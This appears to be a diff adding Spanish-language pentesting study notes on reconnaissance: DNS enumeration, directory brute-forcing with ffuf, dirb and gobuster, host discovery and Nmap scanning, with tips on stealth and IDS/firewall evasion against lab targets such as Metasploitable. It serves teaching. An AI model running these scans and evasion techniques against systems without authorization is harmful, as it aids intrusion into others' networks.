+<p> + PTR -&nbsp;  Resuelve una dirección IP a un nombre de host</p>
+
+
+
+
+<h2> Procedimiento </h2>
+
+</br>
+
+<h2> :white_check_mark: dnsenum </h2>
+
+
+<p> Es una herramienta Perl de enumeración DNS diseñada específicamente para reconocimiento agresivo en pruebas de penetración. Automatiza múltiples técnicas de enumeración DNS para mapear completamente la infraestructura de un dominio. </p>
+
+
+<p> Obtiene el máximo de información DNS (subdominios, hosts, IPs) en un solo comando, combinando:
+
+Zone transfers (AXFR)
+Enumeración por diccionario
+Reverse lookups
+Brute force de subdominios
+Permutaciones wordlist </p>
+
+
+<p> Ejemplo </p>
+
+
+
+<p> 1. &nbsp; Direccion IP de host "A".</p>
+<p> 2. &nbsp; Servidores de nombres con sus respectivas direcciones IP </p>
+<p> 3. &nbsp; Servidores de correo.</p>
+
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/BnJTpnFy/69.png" alt="Descripción de la imagen">
+
+</p>
+
+
+<p> 4. &nbsp; Transferencia de zona</p>
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/pd6KPQSN/70.png" alt="Descripción de la imagen">
+
+</p>
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/ZnrNPG5J/71.png" alt="Descripción de la imagen">
+
+</p>
+
+
+<p> DNS Brute Force es una técnica donde generas miles de subdominios posibles (admin.domain.com, db.domain.com) y consultas DNS para encontrar los que existen realmente.
+
+Por qué funciona
+80% de subdominios siguen patrones predecibles
+Muchas empresas usan nombres obvios: admin, test, db, vpn, staging
+¡Revela infraestructura interna sin tocar hosts! </p>
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/RZPHTQ40/72.png" alt="Descripción de la imagen">
+
+</p>
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/7ZVZ1x1K/73.png" alt="Descripción de la imagen">
+
+</p>
+
+
+
+<h2> :white_check_mark: DIG </h2>
+
+
+<p> dig (Domain Information Groper) es la herramienta definitiva de consulta DNS para pentesters. Es rápida, flexible y verbose, perfecta para enumeración DNS agresiva y reconocimiento sigiloso.</p>
+
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/P5pT2xVv/74.png" alt="Descripción de la imagen">
+
+</p>
+
+<p> Consejo de privacidad: utilice solucionadores públicos como @1.1.1.1 (que admiten DNS sobre HTTPS y DNS sobre TLS) para evitar que su ISP registre sus consultas.</p>
+
+<p> Nota del defensor: Supervise si hay cambios inesperados en el DNS (nuevos registros MX, entradas TXT no autorizadas). Estos pueden ser signos de toma de control de subdominios o errores de configuración.</p>
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/wBdGkyDh/220.png" alt="Descripción de la imagen">
+
+</p>
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/d0q9182P/221.png" alt="Descripción de la imagen">
+
+</p>
+
+
+
+
+
+<!----------------------------------------------------------------------------- Descubrimiento de dierectorios  ----------------------------------------------------------------------------->
+
+
+<h2> :arrow_right: &nbsp; Automated Discovery </h2>
+
+
+
+<p> El descubrimiento automatizado consiste en usar herramientas para descubrir contenido en lugar de hacerlo manualmente. Este proceso está automatizado, ya que suele contener cientos, miles o incluso millones de solicitudes a un servidor web. Estas solicitudes comprueban si un archivo o directorio existe en un sitio web, lo que nos da acceso a recursos que desconocíamos. Este proceso es posible gracias a un recurso llamado listas de palabras. </p>
+
+<p> Las listas de palabras son simplemente archivos de texto que contienen una larga lista de palabras de uso común; pueden abarcar diversos casos de uso. Por ejemplo, una lista de contraseñas incluiría las más utilizadas, mientras que en nuestro caso buscamos contenido, por lo que necesitaríamos una lista con los nombres de directorios y archivos más comunes. </p>
+
+<p> Las listas de palabras son simplemente archivos de texto que contienen una larga lista de palabras de uso común; pueden abarcar diversos casos de uso. Por ejemplo, una lista de contraseñas incluiría las más utilizadas, mientras que en nuestro caso buscamos contenido, por lo que necesitaríamos una lista con los nombres de directorios y archivos más comunes. </p>
+
+
+
+<h3> Herramientas de automatización </h3>
+
+
+<h2> :white_check_mark: &nbsp; ffuf: </h2>
+
+
+<p> ffuf (Fuzz Faster U Fool) es una herramienta de fuzzing "técnica de prueba de seguridad que consiste en enviar datos aleatorios, manipulados o maliciosos a una aplicación o sistema con el objetivo de descubrir vulnerabilidades. " de código abierto extremadamente rápida y eficiente, escrita en Go, diseñada para pruebas de penetración web. Se utiliza principalmente para descubrir recursos ocultos, directorios, archivos, parámetros y endpoints en aplicaciones web mediante ataques de fuerza bruta inteligentes. </p>
+
+
+<p> Flags esenciales</p>
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/RhVj2F6C/75.png" alt="Descripción de la imagen">
+
+</p>
+
+
+<h3> Descubrimiento de directorios y archivos </h3>
+
+
+<p> Prueba 1 Metasploitable  </p>
+
+<p> Con la opcon -c le da color a los diferenentes codigos de respuesta de HTTP </p>
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/3RyLGvvd/76.png" alt="Descripción de la imagen">
+
+</p>
+
+<p> Codigos de respuesta HTTP </p>
+
+<p> • Respuestas informativas (100–199) </p>
+<p> • Respuestas satisfactorias (200–299) </p>
+<p> • Redirecciones (300–399)             </p>
+<p> • Errores de los clientes (400–499)  </p>          
+<p> • Errores de los servidores (500–599) </p>
+
+
+<p> Prueba 2  </p>
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/HxRT0Xvh/77.png" alt="Descripción de la imagen">
+
+</p>
+
+
+<h3> Descubrimiento de archivos con extensiones </h3>
+
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/2SJ5zpr3/78.png" alt="Descripción de la imagen">
+
+</p>
+
+
+<h3> Resultado de las coincidencias de las extensiones con el status del codigo HTTP</h3>
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/BvK23B9L/79.png" alt="Descripción de la imagen">
+
+</p>
+
+
+<h3> Modo silencioso / solo resultados</h3>
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/ZR971M4F/80.png" alt="Descripción de la imagen">
+
+</p>
+
+
+
+<h2> :white_check_mark: &nbsp; dirb </h2>
+
+
+<p> DIRB (Directory Buster) es una herramienta de código abierto para fuerza bruta de directorios y archivos en servidores web. Fue desarrollada por The Dark Raver y es ampliamente utilizada en pruebas de penetración y auditorías de seguridad web. </p>
+
+
+<p> Uso principal </p>
+
+
+<p> • Directorios ocultos (/admin/, /backup/, etc.) </p>
+<p> • Archivos sensibles (config.php, .bak, .old, etc.) </p>
+<p> • Páginas de respaldo y recursos no enlazados </p>
+<p> • Ficheros de configuración expuestos  </p>          
+<p> • APIs ocultas y endpoints no documentados </p>
+
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/7LFk7yLk/81.png" alt="Descripción de la imagen">
+
+</p>
+
+
+<p>  Dirb encontró varias rutas en el servidor que responden con diferentes códigos HTTP, cuando no especificas un diccionario, Dirb usa por defecto /usr/share/dirb/wordlists/common.txt</p>
+
+
+<p>  Podemos obseervar subdirectorios dentro de las rutas (wp-admin - wp-content - wp-includes)</p>
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/wvKBzGnQ/82.png" alt="Descripción de la imagen">
+
+</p>
+
+<p>  Dirb detecta que algunos directorios son listables (se puede ver su contenido en el navegador), por lo que no los escanea automáticamente a menos que se use la opción -w </p>
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/X7NYnF1D/83.png" alt="Descripción de la imagen">
+
+</p>
+
+<p>  Este escaneo revela que el servidor corre WordPress y tiene múltiples rutas expuestas, algunas potencialmente sensibles como: </p>
+
+<p> • xmlrpc.php: &nbsp; puede ser explotado para ataques de fuerza bruta. </p>
+<p> • wp-content/plugins/: &nbsp; útil para detectar plugins vulnerables </p>
+<p> • server-status: &nbsp; confirma que el módulo está activo pero restringido. </p>
+
+
+<p> Escaneo básico especificando el diccionario </p>
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/ZRFjF1mT/84.png" alt="Descripción de la imagen">
+
+</p>
+
+
+
+<p> Escaneo Con extensiones específicas (metasploitable) </p>
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/nLbcS8km/85.png" alt="Descripción de la imagen">
+
+</p>
+
+<p> Si al dar el resultado del escaneo encuentra archivos con extensiones que no se pueden visualizar Podemos usar el comando (curl) para leer su contenido</p>
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/T3rXwKVd/86.png" alt="Descripción de la imagen">
+
+</p>
+
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/q7jShygm/87.png" alt="Descripción de la imagen">
+
+</p>
+
+
+
+<h2> :white_check_mark: &nbsp; Gobuster </h2>
+
+
+<p> Gobuster es una herramienta de fuerza bruta de directorio/archivo, DNS y host virtual de alto rendimiento escrita en Go. Está diseñado para ser rápido, confiable y fácil de usar para profesionales de seguridad y probadores de penetración. </p>
+
+
+<p> Uso principal </p>
+
+
+<p> • Directorio web/Enumeración de archivos: &nbsp; Descubra directorios y archivos ocultos en servidores web </p>
+<p> • Descubrimiento de subdominios DNS: &nbsp; Encuentre subdominios con soporte comodín </p>
+<p> • Detección de hosts virtuales: &nbsp; Identificar hosts virtuales en servidores web de destino</p>
+<p> • Enumeración de almacenamiento en la nube: &nbsp; Descubra los cubos abiertos de Amazon S3 y Google Cloud Storage </p>          
+<p> • Descubrimiento de archivos TFTP: &nbsp; Buscar archivos en servidores TFTP</p>
+<p> • Fuzzing personalizado: &nbsp; Fuzzing flexible con parámetros personalizables </p>
+
+
+<p> Modos de operación </p>
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/q7jShygm/87.png" alt="Descripción de la imagen">
+
+</p>
+
+
+<p> Parámetros esenciales </p>
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/CKSHy2MT/88.png" alt="Descripción de la imagen">
+
+</p>
+
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/gJ0Vj6ZP/89.png" alt="Descripción de la imagen">
+
+</p>
+
+
+
+<p> La función gobuster dir hace fuerza bruta de directorios y archivos en servidores web </p>
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/3JdHmKG2/90.png" alt="Descripción de la imagen">
+
+</p>
+
+
+<p> Escaneo Con extensiones específicas (metasploitable) </p>
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/wTtS3wKM/91.png" alt="Descripción de la imagen">
+
+</p>
+
+
+<p> La función gobuster dns hace fuerza bruta de subdominios mediante consultas DNS bruteforce. </p>
+
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/RhJXCb3V/92.png" alt="Descripción de la imagen">
+
+</p>
+
+</br>
+
+
+<!----------------------------------------------------------------------------- Mapeo de redes  ----------------------------------------------------------------------------->
+
+
+
+<center> <h2> :arrow_right: Network Mapping / Mapeo de redes </h2> </center>
+
+
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/J0C5fNSS/94.png" alt="Descripción de la imagen">
+
+</p>
+
+
+
+<p> Es el proceso de identificar, documentar la topología, comprender su arquitectura e identificar posibles puntos de entrada para una mayor explotacion de una red objetivo, mediante el envío de paquetes directamente a los hosts para obtener respuestas, generando tráfico para mapear dispositivos, interfaces, sistemas operativos, servicios abiertos y rutas de conectividad.</p>
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/bJgvP8BF/95.png" alt="Descripción de la imagen">
+
+</p>
+
+
+<p> Esto es lo que deberiamos tener despues de realizar el mapeo de la red </p>
+
+
+
+<p> 1. &nbsp; Cuantos host hay dentro de la red </p>
+<p> 2. &nbsp; Direcciones IP </p>
+<p> 3. &nbsp; Puertos abiertos </p>
+<p> 4. &nbsp; Que servicios se ejecutan </p>
+<p> 5. &nbsp; Sistema operativo </p>
+
+
+<p> Nota: Se debe incluir en el mapa de la red los enrutadores, conmutadores, Firewalls, sistemas de prevencion de intrusos (ralentizar el escaneo) y cualquier otro elemento de infraestructura </p>
+
+
+
+<!----------------------------------------------------------------------------- Descubrimiento de Host  ----------------------------------------------------------------------------->
+
+
+<center> <h2> :arrow_right: Host Discovery / Descubrimiento de anfitriones </h2> </center>
+
+
+<p> Permite identificar host vivos en una red </p>
+
+
+<p> Tecnicas mas comunes </p>
+
+<p> :white_check_mark: &nbsp; Barrido de PING: </p>
+
+<p>Envio de solicitudes de eco ICMP pasa conocer si el objetivo esta en linea </p>
+<p> Nota: Esta tecnica no funciona cuando esta bloqueado en el Firewall de Windows para que reciba solicitudes ICMP lo que limita su eficacia </p>
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/prSVVsh2/96.png" alt="Descripción de la imagen">
+
+</p>
+
+
+<p> •  &nbsp; Validar si estan en linea [ping + IP] </p>
+<p> •  &nbsp; Especificar la cantidad de paquetes ICMP [ping -c + cantidad de paquetes + IP] en windows se cambia la c por una n  </p>
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/5NfrKQ3t/97.png" alt="Descripción de la imagen">
+
+</p>
+
+
+<h3> :white_check_mark: &nbsp; Encontrar todos los host activos en la RED con <b> FPING </b></h3>
+<p> fping -a -g [IP] /[mascara de red y subred] </p>
+
+
+<p> -a Muestra los objetivos que estan vivos </p>
+<p> -g crea unma lista </p>
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/QMKYKQXK/98.png" alt="Descripción de la imagen">
+
+</p>
+
+
+
+<h3> :white_check_mark: &nbsp; Escaneo ARP: </h3>
+
+<p> El escaneo ARP solo es posible si está en la misma subred que los sistemas de destino. En una red Ethernet (802.3) y Wi-Fi (802.11), necesita saber la dirección MAC de cualquier sistema antes de poder comunicarse con él. La dirección MAC es necesaria para el encabezado de la capa de enlace; contiene las direcciones MAC de origen y destino, entre otros campos. Para obtener la dirección MAC, el sistema operativo envía una consulta ARP. Un host que responde a consultas ARP está activo. La consulta ARP solo funciona si el destino está en la misma subred que usted, es decir, en la misma red Ethernet/Wi-Fi. Debería esperar ver muchas consultas ARP generadas durante un escaneo NMAP de una red local. Si quieres hacer un escaneo con NMAP Solo para realizar un escaneo ARP sin escaneo de puertos, puede usar nmap -PR -sn TARGETS , donde-PR indica que solo desea un escaneo ARP.  </p>
+
+
+<p> ARP El escaneo es particularmente útil durante la post‑explotación y la enumeración de redes internas. Una vez que un atacante obtiene acceso a un sistema dentro de una red, ARP Los escaneos se pueden utilizar para identificar de forma rápida y confiable otros hosts vivos en el mismo segmento local. Porque ARP opera en la Capa 2 y a menudo no está filtrado por firewalls, es una herramienta eficaz para operaciones de equipo rojo y pruebas de penetración interna.  </p>
+
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/9XLwTH0K/267.png" alt="Descripción de la imagen">
+
+</p>
+
+
+
+
+<h3> :white_check_mark: &nbsp; Escaneo ICMP </h3>
+
+<p> Muchos firewalls bloquean el eco ICMP; las nuevas versiones de MS Windows están configuradas con un firewall host que bloquea las solicitudes de eco ICMP de forma predeterminada. Recuerde que una consulta ARP precede a una solicitud ICMP si su objetivo está en la misma subred.  </p>
+
+
+<p> :radio_button: solicitudes de eco ICMP</p>
+    <p> • Para utilizar solicitudes de eco ICMP para descubrir hosts en vivo, agregue la opción -PE (Recuerde agregar -sn si no desea continuar con un escaneo de puertos)  </p>
+
+
+<p> :radio_button: Marca de tiempo ICMP </p>
+    <p> • Debido a que las solicitudes de eco ICMP tienden a bloquearse, también puede considerar las solicitudes de marca de tiempo ICMP o máscara de dirección ICMP para saber si un sistema está en línea,  Agregar la opción -PP le indica a Nmap que utilice solicitudes de marca de tiempo ICMP </p>
+
+
+
+<p> :radio_button: ICMP tipo 17</p>
+
+<p> • Nmap utiliza consultas de máscara de dirección (ICMP tipo 17) y verifica si obtiene una respuesta de máscara de dirección (ICMP tipo 18). Este escaneo se puede habilitar con la opción -PM, las nuevas versiones de MS Windows están configuradas con un firewall host que bloquea este tipo de solicitudes lo cual puede generar que no logre identificar ningun Host en la red   </p>
+
+
+
+
+<h3> :white_check_mark: &nbsp; Escaneo TCP Y UDP </h3>
+
+
+<P> :radio_button: &nbsp; TCP Syn ping:</P>
+
+<p> Escaneo medio abierto en Nmap se coloce como escaneo sigiloso, si el host esta vivo, responde con un TCP Syn-AC </p>
+<p> Nota: En algunos casos el hosts puede no responder las solicitudes de sincronizacion TCP y los resultados pueden versen afectados, si el puerto esta cerrado NMAP puede pensar que el host muerto </p>
+
+
+<p> Podemos enviar un paquete con el indicador SYN (Sincronizar) configurado en TCP puerto 80 (80 por defecto) y esperar una respuesta. Un puerto abierto debería responder con un SYN/ACK (Reconocimiento); un puerto cerrado daría como resultado un RST (Restablecimiento). En este caso, solo verificamos si recibimos una respuesta para inferir si el host está activo. El estado específico del puerto no es significativo aquí.</p>
+
+<p> para usar TCP SYN ping, puedes hacerlo a través de la opción -PS seguida del número de puerto, rango, lista o una combinación de ellos. Por ejemplo,-PS21 apuntará al puerto 21, mientras que-PS21-25 apuntará a los puertos 21, 22, 23, 24 y 25. Finalmente,-PS80,443,8080 se centrará en los tres puertos 80, 443 y 8080. 
+
+
+Los usuarios privilegiados (root y sudoers) pueden enviar paquetes TCP SYN y no necesitan completar el protocolo de enlace TCP de 3 vías incluso si el puerto está abierto. Los usuarios sin privilegios no tienen más remedio que completar el protocolo de enlace de 3 vías si el puerto está abierto.</p>
+
+
+
+<P> :radio_button: &nbsp; TCP ACK </P>
+
+<p> Envia paquetes TCP ACK a un puerto especifico en un objetivo para comprobar si el anfitrion esta vivo, esta tecnica no espera respuesta pero si recibe un restablecimiento de TCP  </p>
+
+
+<p> Como habrás adivinado, esto envía un paquete con un indicador ACK establecido. Debes correr NMAP como usuario privilegiado para lograr esto. Si lo pruebas como usuario sin privilegios, NMAP intentará un apretón de manos en tres direcciones.
+
+De forma predeterminada, se utiliza el puerto 80. La sintaxis es similar al ping TCP SYN. debe ir seguido de un número de puerto, un rango de números de puerto, una lista o una combinación de ellos. -PA Por ejemplo, considere -PA21 ,-PA21-25 y-PA80,443,8080 . Si no se especifica ningún puerto, se utilizará el puerto 80.  </p>
+
+
+
+
+<p> :radio_button: &nbsp; UDP Ping</p>
+
+<p> Envia paquetes UDP a un puerto en especifico para verificar si hay anfitrion vivo </p>
+
+
+<p> podemos usar UDP para descubrir si el host está en línea. A diferencia de un ping TCP SYN, no se espera que enviar un paquete UDP a un puerto abierto genere una respuesta. Sin embargo, si enviamos un paquete UDP a un puerto UDP cerrado, esperamos obtener un paquete inalcanzable para el puerto ICMP; esto indica que el sistema de destino está activo y disponible. </p>
+
+
+<p> La sintaxis para especificar los puertos es similar a la del ping TCP SYN y el ping TCP ACK; se debe usar -PU</p>
+
+
+
+<p> :white_check_mark: &nbsp; SYN - ACK ping </p>
+<p> Envia un paquete Syn-ACK a un puerto especifico para verificar si un host esta vivo, si recibe un reinicio de TCP, nuevamente indica que el host esta vivo  </p>
+
+
+<p> Nota: Para escoger la mejor tecnica se debe tener en cuenta las caracteristicas de la red, las herramientas de seguridad  </p>
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/zv1GTpWn/268.png" alt="Descripción de la imagen">
+
+</p>
+
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/fyZMVynC/269.png" alt="Descripción de la imagen">
+
+</p>
+
+
+
+
+</br>
+
+
+<h2> :arrow_right: Host Discovery With Nmap / Descubrimiento de host con Nmap </h2>
+
+
+<p> Nmap identifica los host activos en la red usando tecnicas como ICMP solicitudes de ARP o sondas TCP/UDP</p>
+
+
+<p> Es una herramienta esencial en pruebas de penetración para el descubrimiento de hosts y servicios en una red. Permite descubrir información básica sobre los sistemas objetivo, como hosts vivos, puertos abiertos y servicios, sin profundizar en detalles específicos.</p>
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/x8gB3LcB/99.png" alt="Descripción de la imagen">
+
+</p>
+
+
+<p><b> :white_check_mark: • Descubrimiento de hosts: &nbsp; Detecta hosts vivos en la red (sin escanear puertos).</b></p> 
+
+<p> El escaneo de deteccion de host (-sn) es enviar un paquete de solicitud de eco ICMP al destino, un TCP SYN al puerto 443, un TCP ACK al puerto 80 y una solicitud de marca de tiempo ICMP. Si el objetivo responde al eco de ICMP o a los paquetes mencionados anteriormente, se considera activo. un escaneo de este tipo para la detección de host de una subred completa a veces se denomina barrido de ping.</p> 
+
+
+</br>
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/T2B41B89/5-1.png" alt="Descripción de la imagen">
+
+</p>
+
+</br>
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/wTtwd27m/5.png" alt="Descripción de la imagen">
+
+</p>
+
+
+<p> El escaneo (-sn) utiliza el protocolo ARP para realizr el descubrimiento del host</p> 
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/7PKYrcBP/100.png" alt="Descripción de la imagen">
+
+</p>
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/ydVBwXc8/101.png" alt="Descripción de la imagen">
+
+</p>
+
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/NFnc93V7/102.png" alt="Descripción de la imagen">
+
+</p>
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/MpVSHrYd/103.png" alt="Descripción de la imagen">
+
+</p>
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/MHNCKyM3/104.png" alt="Descripción de la imagen">
+
+</p>
+
+
+
+
+<p><b> :white_check_mark: nmap -sn -PS :&nbsp; realiza un ping scan TCP SYN (también conocido como half-open scan) para descubrir hosts activos en la red sin escanear puertos. </b></p> 
+
+<p> -sn: &nbsp;Desactiva el escaneo de puertos. Solo hace descubrimiento de hosts (host discovery).</p> 
+<p> -PS: &nbsp;Usa paquetes TCP SYN para el ping scan. Envía un SYN a los puertos por defecto (80, 443, 22, 113, 9929, 6667, etc.) y espera respuesta.</p> 
+
+
+<p><b> Ventajas </b></p> 
+
+<p><b> Stealthy:</b> No completa la conexión TCP (evita logs de conexión completa)</p> 
+<p><b> Eficiente: </b>Más rápido que ping ICMP tradicional </p> 
+<p><b> Bypassa firewalls: </b> Muchos firewalls permiten SYN pero bloquean ICMP </p> 
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/zBFGT1Zx/105.png" alt="Descripción de la imagen">
+
+</p>
+
+
+
+<p><b> :white_check_mark: nmap -sn -PA :&nbsp; realiza un ping scan TCP ACK para descubrir hosts activos en la red. </b></p> 
+
+
+<p> -sn: &nbsp;Solo descubre hosts (host discovery), sin escaneo de puertos.</p> 
+<p> -PS: &nbsp;Usa paquetes TCP ACK (no SYN) para el ping scan. Envía un paquete ACK a los puertos por defecto (80, 443, 22, etc.) y espera respuesta.</p> 
+
+
+<p><b> Ventajas </b></p> 
+
+<p><b> Mas Stealthy:</b> El ACK es menos ruidoso que SYN en algunos sistemas</p> 
+<p><b> Eficiente: </b>Menos propenso a ser bloqueado por IDS/IPS en redes estrictas </p> 
+<p><b> Bypassa firewalls: </b> Muchos firewalls permiten ACK de salida, pero bloquean SYN entrantes </p> 
+
+
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/5yfqm1XG/106.png" alt="Descripción de la imagen">
+
+</p>
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/1XtGnBnB/107.png" alt="Descripción de la imagen">
+
+</p>
+
+<p> -PS: &nbsp;es ideal para reconocimiento rápido en redes menos protegidas</p> 
+<p> -PA: &nbsp;es más eficaz en entornos con firewalls estrictos o sistemas de detección de intrusiones (IDS/IPS), ya que el ACK es menos sospechoso y puede pasar desapercibido.</p> 
+
+
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/Bv02c4P4/108.png" alt="Descripción de la imagen">
+
+</p>
+
+
+
+
+
+
+<!----------------------------------------------------------------------------- Escaneo de puertos ----------------------------------------------------------------------------->
+
+
+
+<center> <h2> :arrow_right: Port Scanning / Escaneo de puertos </h2> </center>
+
+
+
+<p> Estados de puertos en Nmap</p> 
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/MpRHRTvZ/139.png" alt="Descripción de la imagen">
+
+</p>
+
+
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/zB5qJGPb/109.png" alt="Descripción de la imagen">
+
+</p>
+
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/0rg1z0QV/116.png" alt="Descripción de la imagen">
+
+</p>
+
+
+
+
+<p> -F: &nbsp;La opción -F en Nmap activa el escaneo rápido de puertos frecuentes (Fast scan mode). En lugar de escanear los 1000 puertos TCP más comunes (modo por defecto), -F escanea solo los 100 puertos TCP más comunes, lo que acelera drásticamente el proceso.</p> 
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/K8MdWyvk/110.png" alt="Descripción de la imagen">
+
+</p>
+
+
+<p> -p: &nbsp; La opción -p en Nmap especifica puertos o rangos de puertos a escanear, anulando los defaults (top 1000 TCP). Es la más flexible para targeting preciso. Si son multiples puertos se separan con "," </p> 
+ sin espacio
+<p> -p-: &nbsp; Enumeracion completa de todos los 65.535 puertos </p> 
+<p> Espicificar rango de puertos -p1-100 + IP </p> 
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/q78g4YQs/111.png" alt="Descripción de la imagen">
+
+</p>
+
+
+
+<p> :white_check_mark: -Pn: &nbsp;El parámetro -Pn en Nmap le indica al escáner que no realice el descubrimiento de hosts (host discovery), es decir, trata a todos los hosts objetivo como si estuvieran "online" sin importar si responden al ping o no. </p> 
+
+<p> Casos prácticos más comunes donde -Pn es esencial en pentesting:</p> 
+
+
+
+<p> 1. Firewalls que bloquean ICMP/Ping (empresas, cloud AWS/Azure, servidores web) </p>
+<p> 2. Escaneos de Internet/DMZ (servidores públicos bloquean ping) </p>
+<p> 3. Cloud Environments (AWS, GCP, Azure - Security Groups bloquean ICMP) </p>
+<p> 4. Redes Corporativas/Enterprise (IDS/IPS + firewalls Next-Gen) </p>
+<p> 5. Windows Hosts (bloquean ICMP por defecto) </p>
+<p> 6. Recon de Subdominios/WAF-protected (CloudFlare, Akamai) </p>
+<p> 7. SCADA/ICS/OT Networks (equipos industriales silenciosos) </p>
+<p> 8. Pentesting con Timing lento/evasión IDS </p>
+
+
+
+<p> Ejemplo de escaneo a sistema windows con y sin la opcion -Pn </p> 
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/nLrBL4Q3/115.png" alt="Descripción de la imagen">
+
+</p>
+
+
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/85dMgQwp/112.png" alt="Descripción de la imagen">
+
+</p>
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/MK94JgrP/113.png" alt="Descripción de la imagen">
+
+</p>
+
+
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/bNsmtgTw/114.png" alt="Descripción de la imagen">
+
+</p>
+
+
+<p> Cuándo NO usarlo: redes locales confiables, discovery rápido, escaneos masivos sin tiempo.</p> 
+
+
+
+<p><b> :white_check_mark: Escaneo de puertos abiertos :&nbsp; El escaneo (-sS) usa un escaneo SYN para identificar puertos abiertos de manera sigilosa. Sin completar la conexión TCP </b></p> 
+
+</br>
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/xdy23nQn/5-2.png" alt="Descripción de la imagen">
+
+</p>
+
+</br>
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/7YRCzMPw/5-5.png" alt="Descripción de la imagen">
+
+</p>
+
+
+
+<p><b> :white_check_mark: Escaneo de conexión TCP (-sT) :&nbsp; Utiliza el mecanismo de red del sistema operativo subyacente para establecer una conexión TCP completa con el dispositivo de destino que se está escaneando. Dado que crea una conexión completa, crea más tráfico (y, por lo tanto, tarda más en ejecutarse).</b></p> 
+
+</br>
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/Hs8YqGH1/5-6.png" alt="Descripción de la imagen">
+
+
+
+
+
+<p><b> :white_check_mark: Escaneo UDP (-sU) :&nbsp; si se intenta enumerar un servidor DNS, SNMP o DHCP. Todos estos servicios utilizan UDP para la comunicación entre el cliente y el servidor. Para escanear puertos UDP, Nmap envía un paquete UDP a todos los puertos especificados en la configuración de la línea de comandos. Espera la respuesta del destino. Si recibe un mensaje ICMP de puerto inaccesible, ese puerto se marca como cerrado. Si no se recibe respuesta del puerto UDP de destino, Nmap lo marca como abierto/filtrado</b></p> 
+
+<p>NOTA:&nbsp; Tenga en cuenta que los mensajes ICMP inaccesibles a veces pueden tener una velocidad limitada y, en ese caso, un escaneo de puerto UDP puede tardar mucho más. La limitación de velocidad ICMP se utiliza principalmente para limitar el comportamiento de gusanos o virus y normalmente debe configurarse para permitir que entre el 1 % y el 5 % del ancho de banda entrante disponible (a velocidades de 10 Mbps o 100 Mbps) o entre 100 kbps y 10 000 kbps (a velocidades de 1 Gbps o 10 Gbps) se utilice para el tráfico ICMP.</p>
+
+</br>
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/yYTgNgWy/5-7.png" alt="Descripción de la imagen">
+
+</p>
+
+</br>
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/DwCsyJmb/5-8.png" alt="Descripción de la imagen">
+
+</p>
+
+
+</br>
+
+
+<!----------------------------------------------------------------------------- Deteccion de servicios y sistema operativo ----------------------------------------------------------------------------->
+
+
+</br>
+
+<center> <h2> :arrow_right: Service detection & OS  / Deteccion de servicios y sistema operativo </h2> </center>
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/TPQddJNQ/117.png" alt="Descripción de la imagen">
+
+</p>
+
+
+<p><b> :white_check_mark: Detección de sistemas operativos (-O) y servicios básicos (-sV) :&nbsp; Determina el sistema operativo y las versiones de servicios sin explotar vulnerabilidades. </b></p> 
+
+</br>
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/hvRZy71Y/5-3.png" alt="Descripción de la imagen">
+
+</p>
+
+
+<p><b> "Forzar a que indique el S.O" </b> El parámetro --osscan-guess (o -O --osscan-guess) en Nmap activa la detección especulativa de sistemas operativos cuando la coincidencia de huella no es exacta al 100%. </p> 
+
+
+
